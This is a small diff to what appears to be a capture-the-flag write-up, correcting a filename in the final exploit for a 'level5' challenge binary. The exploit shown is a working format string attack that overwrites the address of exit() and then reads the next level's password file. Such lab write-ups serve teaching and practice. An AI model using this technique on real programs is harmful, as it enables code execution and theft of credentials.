@@ -54,6 +54,6 @@ The address of `exit()` is at the 4th position (`41414141`).
 Our final format string attack:
 ```
 python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
-cat /tmp/exploit - | ./level5
+cat /tmp/exploit5 - | ./level5
 cat /home/user/level6/.pass
 ```
